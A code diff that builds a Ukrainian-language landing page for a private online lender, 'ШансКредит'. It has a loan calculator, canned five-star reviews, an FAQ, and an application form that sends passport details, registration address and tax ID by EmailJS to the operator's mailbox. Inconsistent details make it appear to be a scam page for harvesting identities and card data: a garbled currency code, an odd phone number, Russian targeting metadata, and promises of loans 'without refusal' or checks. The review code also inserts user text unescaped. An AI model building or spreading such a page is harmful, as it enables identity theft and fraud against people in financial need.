@@ -1,10 +1,375 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="uk">
 <head>
-  <meta charset="UTF-8">
-  <title>$Title$</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>ШансКредит — онлайн заявка</title>
+
+    <!-- SEO UA -->
+    <meta name="description" content="Оформіть онлайн-заявку на кредит до 300 000 UAN. Швидке схвалення, гроші на картку без візиту до офісу. Працюємо 24/7 по всій Українi." />
+    <meta name="keywords" content="онлайн кредит, кредит терміново, заявка на кредит, позика без відмови, кредит на картку, швидка позика, термінові гроші, гроші до зарплати, позика цілодобово, взяти кредит без відмови, гроші без перевірок, мікропозика, гроші на картку без візиту в банк, приватна позика онлайн, кредит Росія, позика без довідок, терміново потрібні гроші" />
+
+    <meta name="robots" content="index, follow"/>
+    <link rel="canonical" href="https://shans.vercel.app/"/>
+
+    <!-- Open Graph -->
+    <meta property="og:title" content="ШансКредит — Кредит до 300 000 UAN онлайн"/>
+    <meta property="og:description" content="Отримайте гроші на картку — швидке оформлення без візиту до офісу. Працюємо 24/7."/>
+    <meta property="og:image" content="https://cdn-icons-png.flaticon.com/512/6942/6942962.png"/>
+    <meta property="og:url" content="https://shans.vercel.app/"/>
+    <meta property="og:type" content="website"/>
+
+    <!-- JSON-LD (оставил RU, т.к. поисковики читают язык по контенту, а не UI) -->
+    <script type="application/ld+json">
+        {
+            "@context":"https://schema.org",
+            "@type":"FinancialService",
+            "name":"ШансКредит",
+            "url":"https://shans.vercel.app/",
+            "logo":"https://cdn-icons-png.flaticon.com/512/6942/6942962.png",
+            "description":"Онлайн-кредиты до 300 000 UAN без визита в офис, заявка за 2 минуты. Перевод на карту.",
+            "areaServed":"RU",
+            "openingHours":"Mo-Su 00:00-23:59",
+            "contactPoint":{
+                "@type":"ContactPoint",
+                "telephone":"+38-896-357-447",
+                "contactType":"customer support",
+                "areaServed":"RU",
+                "availableLanguage":["Russian"]
+            }
+        }
+    </script>
+
+    <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/6942/6942962.png" type="image/png"/>
+    <style>
+        /* ----- базовые стили (не менялись) ----- */
+        body{margin:0;font-family:Arial,sans-serif;background:#f6f9fc;color:#222}
+        header{background:#5528d2;color:#fff;text-align:center;padding:24px 16px}
+        h1{font-size:28px;font-weight:bold;margin:0}
+        .container{max-width:600px;margin:32px auto;background:#fff;border-radius:16px;padding:24px;box-shadow:0 4px 20px rgba(0,0,0,.1)}
+        h2{color:#5528d2;text-align:center}
+        label{font-weight:bold;display:block;margin-bottom:6px}
+        input,select,textarea{width:100%;padding:12px;margin-bottom:16px;border:1px solid #ccc;border-radius:8px;font-size:16px}
+        button{width:100%;background:#5528d2;color:#fff;border:none;padding:14px;font-size:16px;border-radius:8px;cursor:pointer}
+        button:hover{background:#3f1da8}
+        .result-box{background:#ede7fd;padding:16px;border-radius:8px;margin-bottom:24px}
+        .steps{background:#faf8ff;border-radius:16px;padding:16px;margin-top:40px}
+        .step{margin-bottom:16px;font-size:16px}
+        .trust{border-radius:15px;text-align:center;margin:0 auto;font-size:18px;color:#fff;padding:16px;background:#888;width:70%}
+        .footer{text-align:center;font-size:14px;color:#888;padding:40px 20px 20px}
+        #toast{display:none;position:fixed;top:20px;left:50%;transform:translateX(-50%);background:#d1e7dd;color:#0f5132;padding:16px 20px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,.2);z-index:9999;font-size:16px;animation:fadeInSlideDown .4s ease-out}
+        #toast span{float:right;cursor:pointer;margin-left:12px}
+        @keyframes fadeInSlideDown{from{opacity:0;transform:translate(-50%,-20px)}to{opacity:1;transform:translate(-50%,0)}}
+        @media(max-width:500px){#reviews textarea,#reviews input,#reviews select{font-size:14px}}
+    </style>
 </head>
+
 <body>
-$END$
+<header>
+    <h1>ШансКредит — Швидке фінансове рішення</h1>
+    <div style="margin-top:8px;font-size:16px">
+        📧 <a style="color:#fff;text-decoration:underline" href="mailto:shanscredyt@meta.ua">shanscredyt@meta.ua</a> ·
+        📞 <a style="color:#fff;text-decoration:underline" href="tel:+38-896-357-447">+38-896-357-447</a>
+    </div>
+</header>
+
+<!-- toast -->
+<div id="toast">✅ Заявку надіслано! Ми зв’яжемося з вами протягом години.<br>💳 У разі схвалення потрібна іменна картка.<span onclick="document.getElementById('toast').style.display='none'">✖</span></div>
+
+<h2>Розрахуйте свій онлайн-кредит просто зараз</h2>
+
+<!-- ===== калькулятор ===== -->
+<div class="container">
+    <h2>💰 Кредитний калькулятор</h2>
+
+    <label>Сума кредиту (до 300 000 UAN):</label>
+    <input type="range" id="amount" min="1000" max="300000" step="1000" value="10000" oninput="calculate()">
+    <div>Ви обрали: <strong><span id="amountVal">10000</span> UAN</strong></div>
+
+    <label>Термін (до 61 дня):</label>
+    <input type="range" id="days" min="1" max="61" step="1" value="30" oninput="calculate()">
+    <div>Термін: <strong><span id="daysVal">30</span> днів</strong></div>
+
+    <div class="result-box">
+        <p>Основна сума: <strong><span id="base">10000</span> UAN</strong></p>
+        <p>Відсотки: <strong><span id="interest">600</span> UAN</strong></p>
+        <p>До сплати: <strong><span id="total">10600</span> UAN</strong></p>
+    </div>
+
+    <button onclick="document.getElementById('form').scrollIntoView({behavior:'smooth'})">Оформити заявку</button>
+</div>
+
+<!-- ===== кроки ===== -->
+<div class="container steps">
+    <h2>Як отримати кредит онлайн</h2>
+    <div class="step">1. Оберіть суму та термін кредиту</div>
+    <div class="step">2. Заповніть просту анкету</div>
+    <div class="step">3. Підтвердьте заявку та підпишіть договір через SMS</div>
+    <div class="step">4. Отримайте гроші на картку</div>
+</div>
+
+<div class="trust">Нам довіряють понад 200 000 клієнтів по всіій Українi — цілодобова підтримка та безпека даних.</div>
+
+<h2>Подайте заявку та отримайте гроші на картку</h2>
+
+<!-- ===== форма ===== -->
+<div class="container" id="form">
+    <h2>📨 Заповніть анкету</h2>
+    <form id="credit-form">
+        <input type="hidden" id="hiddenAmount"  name="amount">
+        <input type="hidden" id="hiddenTerm"    name="term">
+        <input type="hidden" id="hiddenBase"    name="base">
+        <input type="hidden" id="hiddenInterest"name="interest">
+        <input type="hidden" id="hiddenTotal"   name="total">
+
+        <input type="text"  name="lastname"             placeholder="Прізвище"            required>
+        <input type="text"  name="firstname"            placeholder="Ім’я"                required>
+        <input type="text"  name="middlename"           placeholder="По батькові"         required>
+        <input type="text"  name="phone"                placeholder="Телефон"             required>
+        <input type="email" name="email"                placeholder="Email"               required>
+        <input type="text"  name="city"                 placeholder="Місто">
+
+        <input type="text"  name="passport"             placeholder="Серія та номер паспорту">
+        <p>Вкажіть дату видачі паспорту:</p>
+        <input type="date"  name="passport_date">
+        <input type="text"  name="issued_by"            placeholder="Ким виданий (як у паспорті)">
+        <input type="text"  name="registration_address" placeholder="Адреса реєстрації">
+        <input type="text"  name="tax_id"               placeholder="ІПН / Ідентифікаційний код">
+        <textarea           name="comment"              placeholder="Коментар"></textarea>
+
+        <button type="submit">Надіслати</button>
+    </form>
+</div>
+
+<!-- ===== відгуки ===== -->
+<h2>Відповіді на популярні запитання</h2>
+
+<div class="container" id="reviews">
+    <h2>Відгуки клієнтів</h2>
+
+    <!-- 3 статичні відгуки -->
+    <section itemscope itemtype="https://schema.org/Organization">
+        <div itemprop="review" itemscope itemtype="https://schema.org/Review">
+            <p><strong itemprop="author">Анна</strong> —
+                <span itemprop="reviewRating" itemscope itemtype="https://schema.org/Rating">
+                  <meta itemprop="worstRating" content="1"/>
+                  <meta itemprop="bestRating"  content="5"/>
+                  <span itemprop="ratingValue">5</span> ⭐⭐⭐⭐⭐
+               </span>
+            </p>
+            <p itemprop="reviewBody">Дуже задоволена, все швидко та зручно.</p>
+        </div>
+
+        <div itemprop="review" itemscope itemtype="https://schema.org/Review">
+            <p><strong itemprop="author">Сергій</strong> —
+                <span itemprop="reviewRating" itemscope itemtype="https://schema.org/Rating">
+                  <meta itemprop="worstRating" content="1"/>
+                  <meta itemprop="bestRating"  content="5"/>
+                  <span itemprop="ratingValue">4</span> ⭐⭐⭐⭐☆
+               </span>
+            </p>
+            <p itemprop="reviewBody">Оформив без проблем, дякую.</p>
+        </div>
+
+        <div itemprop="review" itemscope itemtype="https://schema.org/Review">
+            <p><strong itemprop="author">Наталія</strong> —
+                <span itemprop="reviewRating" itemscope itemtype="https://schema.org/Rating">
+                  <meta itemprop="worstRating" content="1"/>
+                  <meta itemprop="bestRating"  content="5"/>
+                  <span itemprop="ratingValue">5</span> ⭐⭐⭐⭐⭐
+               </span>
+            </p>
+            <p itemprop="reviewBody">Отримала гроші того ж дня!</p>
+        </div>
+    </section>
+
+    <!-- динамічні відгуки -->
+    <div id="review-wrapper">
+        <meta itemprop="name" content="ШансКредит">
+        <meta itemprop="url"  content="https://shans.vercel.app/">
+        <div id="review-list"></div>
+    </div>
+
+    <div id="pagination" style="text-align:center;margin-top:20px">
+        <button id="prevPage" disabled>← Попередня</button>
+        <span id="pageIndicator" style="margin:0 10px">1</span>
+        <button id="nextPage">Наступна →</button>
+    </div>
+
+    <form id="review-form" style="margin-top:32px">
+        <label for="review-name">Ваше ім’я:</label>
+        <input id="review-name" placeholder="Іван Іванов" required>
+
+        <label for="review-rating">Оцінка:</label>
+        <select id="review-rating" required>
+            <option value="">Оберіть оцінку</option>
+            <option value="5">5 — Відмінно</option>
+            <option value="4">4 — Добре</option>
+            <option value="3">3 — Задовільно</option>
+            <option value="2">2 — Погано</option>
+            <option value="1">1 — Дуже погано</option>
+        </select>
+
+        <label for="review-text">Ваш відгук:</label>
+        <textarea id="review-text" rows="4" placeholder="Напишіть кілька слів…" required></textarea>
+
+        <button type="submit">Залишити відгук</button>
+    </form>
+</div>
+
+<!-- ===== FAQ ===== -->
+<section class="container" id="faq">
+    <h2>❓ Поширені запитання (FAQ)</h2>
+
+    <div itemscope itemtype="https://schema.org/FAQPage">
+        <div itemprop="mainEntity" itemscope itemtype="https://schema.org/Question" style="margin-bottom:20px">
+            <h3 itemprop="name">Як швидко я отримаю гроші після подання заявки?</h3>
+            <div itemprop="acceptedAnswer" itemscope itemtype="https://schema.org/Answer">
+                <p itemprop="text">Після схвалення кошти зазвичай надходять на картку протягом 15–30 хвилин.</p>
+            </div>
+        </div>
+
+        <div itemprop="mainEntity" itemscope itemtype="https://schema.org/Question" style="margin-bottom:20px">
+            <h3 itemprop="name">Чи потрібні довідки про доходи або поручителі?</h3>
+            <div itemprop="acceptedAnswer" itemscope itemtype="https://schema.org/Answer">
+                <p itemprop="text">Для сум до 30 000 UAN достатньо анкети без довідок і поручителів. Інколи можуть знадобитися додаткові документи.</p>
+            </div>
+        </div>
+
+        <div itemprop="mainEntity" itemscope itemtype="https://schema.org/Question" style="margin-bottom:20px">
+            <h3 itemprop="name">Яку суму можна отримати?</h3>
+            <div itemprop="acceptedAnswer" itemscope itemtype="https://schema.org/Answer">
+                <p itemprop="text">Від 1 000 UAN до 300 000 UAN — залежно від ваших даних. Можуть попросити ІПН чи фото документів.</p>
+            </div>
+        </div>
+
+        <div itemprop="mainEntity" itemscope itemtype="https://schema.org/Question" style="margin-bottom:20px">
+            <h3 itemprop="name">Чи працюєте ви лише по Українi?</h3>
+            <div itemprop="acceptedAnswer" itemscope itemtype="https://schema.org/Answer">
+                <p itemprop="text">Так, сервіс наразі доступний по всій території України.</p>
+            </div>
+        </div>
+
+        <div itemprop="mainEntity" itemscope itemtype="https://schema.org/Question" style="margin-bottom:20px">
+            <h3 itemprop="name">Які картки підходять для отримання коштів?</h3>
+            <div itemprop="acceptedAnswer" itemscope itemtype="https://schema.org/Answer">
+                <p itemprop="text">Будь-які іменні картки Українських банків — Visa, MasterCard.</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<style>
+    #faq h3{font-size:18px;color:#5528d2;margin-bottom:6px}
+    #faq p{font-size:16px;margin-top:0;color:#333}
+</style>
+
+<!-- ===== Про сервіс ===== -->
+<section class="container" style="margin-top:48px">
+    <h2>Про сервіс ШансКредит</h2>
+    <p><strong>ШансКредит</strong> — приватна послуга термінової фінансової допомоги. Ми працюємо напряму з клієнтом та розглядаємо кожну заявку індивідуально.</p>
+    <p>Увесь процес відбувається онлайн, без відвідування офісу. Заявку можна подати у будь-який час; ми обробляємо звернення вручну та зв’яжемося з вами якомога швидше.</p>
+    <p>Ви отримуєте рішення без посередників, банків чи МФО. У деяких випадках можуть знадобитися додаткові дані.</p>
+    <p>Працюємо по усій України. Зворотній зв’язок: <a href="mailto:shanscredyt@meta.ua">shanscredyt@meta.ua</a> · тел. <a href="tel:+38-896-357-447">+38-896-357-447</a></p>
+</section>
+
+<!-- ===== Політика конфіденційності ===== -->
+<section class="container" style="margin-top:48px">
+    <h2>Політика конфіденційності</h2>
+    <p>Ми не передаємо ваші особисті дані третім особам без вашої згоди. Інформацію з анкети використовуємо лише для розгляду кредитної заявки.</p>
+    <p>Обробка відбувається відповідно до законодавства України.</p>
+    <p>За бажанням дані можна видалити, написавши на&nbsp;<a href="mailto:shanscredyt@meta.ua">shanscredyt@meta.ua</a></p>
+</section>
+
+<div class="footer">© 2025 ШансКредит · Контакти: shanscredyt@meta.ua · +38-896-357-447</div>
+
+<!-- ===== скрипти (тексти повідомлень перекладені) ===== -->
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script>
+    emailjs.init("xFwYyiKcz3DVulVzm");
+    const form  = document.getElementById("credit-form");
+    const toast = document.getElementById("toast");
+
+    function calculate(){
+        const amount = +document.getElementById("amount").value;
+        const days   = +document.getElementById("days").value;
+        const rate   = 0.002;
+        const perc   = Math.round(amount*rate*days);
+        const total  = amount+perc;
+
+        document.getElementById("amountVal").textContent = amount;
+        document.getElementById("daysVal").textContent   = days;
+        document.getElementById("base").textContent      = amount;
+        document.getElementById("interest").textContent  = perc;
+        document.getElementById("total").textContent     = total;
+
+        document.getElementById("hiddenAmount").value   = amount;
+        document.getElementById("hiddenTerm").value     = days;
+        document.getElementById("hiddenBase").value     = amount;
+        document.getElementById("hiddenInterest").value = perc;
+        document.getElementById("hiddenTotal").value    = total;
+    }
+    window.onload = calculate;
+
+    form.addEventListener("submit", e=>{
+        e.preventDefault();
+        calculate();
+        emailjs.sendForm("service_z3d6w05","template_tzy51bm",form,"xFwYyiKcz3DVulVzm")
+            .then(()=>{
+                form.reset(); calculate();
+                toast.style.display="block";
+                window.scrollTo({top:0,behavior:"smooth"});
+            })
+            .catch(()=>alert("Помилка під час надсилання заявки. Спробуйте пізніше."));
+    });
+</script>
+
+<script>
+    /* ----- відгуки (тексти залишили RU для прикладу, можна перекласти) ----- */
+    const predefinedReviews=[{name:"Анна",rating:5,text:"Дуже задоволена, все швидко та зручно."},/* … інші … */];
+    const REVIEWS_PER_PAGE=10;let currentPage=1,allReviews=[];
+    const loadUserReviews=()=>JSON.parse(localStorage.getItem("userReviews")||"[]");
+    const saveReview=r=>{const s=loadUserReviews();s.push(r);localStorage.setItem("userReviews",JSON.stringify(s));};
+    function renderCurrentPage(){
+        const cont=document.getElementById("review-list");
+        const ind =document.getElementById("pageIndicator");
+        const prev=document.getElementById("prevPage");
+        const next=document.getElementById("nextPage");
+        const start=(currentPage-1)*REVIEWS_PER_PAGE, end=start+REVIEWS_PER_PAGE;
+        const total=Math.ceil(allReviews.length/REVIEWS_PER_PAGE);
+        cont.innerHTML="";
+        allReviews.slice(start,end).forEach(({name,rating,text})=>{
+            const stars="⭐".repeat(rating)+"☆".repeat(5-rating);
+            cont.insertAdjacentHTML("beforeend",
+                `<div class="review-item"><p><strong>${name}</strong> — ${stars}</p><p>${text}</p></div>`);
+        });
+        ind.textContent=`${currentPage} / ${total}`;
+        prev.disabled=currentPage===1;next.disabled=currentPage===total;
+    }
+    function goToPage(o){const t=Math.ceil(allReviews.length/REVIEWS_PER_PAGE);currentPage=Math.min(Math.max(1,currentPage+o),t);renderCurrentPage();}
+    document.getElementById("prevPage").onclick=()=>goToPage(-1);
+    document.getElementById("nextPage").onclick=()=>goToPage(1);
+    document.getElementById("review-form").onsubmit=e=>{
+        e.preventDefault();
+        const name=document.getElementById("review-name").value.trim();
+        const rating=document.getElementById("review-rating").value;
+        const text=document.getElementById("review-text").value.trim();
+        if(!name||!rating||!text)return;
+        saveReview({name,rating:+rating,text});
+        allReviews=[...predefinedReviews,...loadUserReviews()];
+        currentPage=Math.ceil(allReviews.length/REVIEWS_PER_PAGE);
+        renderCurrentPage();e.target.reset();
+    };
+    document.addEventListener("DOMContentLoaded",()=>{
+        allReviews=[...predefinedReviews,...loadUserReviews()];renderCurrentPage();
+    });
+</script>
+
+<!-- чат -->
+<script>
+    var Tawk_API=Tawk_API||{},Tawk_LoadStart=new Date();
+    (function(){var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+        s1.async=true;s1.src='https://embed.tawk.to/6842ca479ed8c2190a6d4e49/1it2ecaje';s1.charset='UTF-8';s1.setAttribute('crossorigin','*');s0.parentNode.insertBefore(s1,s0);})();
+</script>
 </body>
 </html>
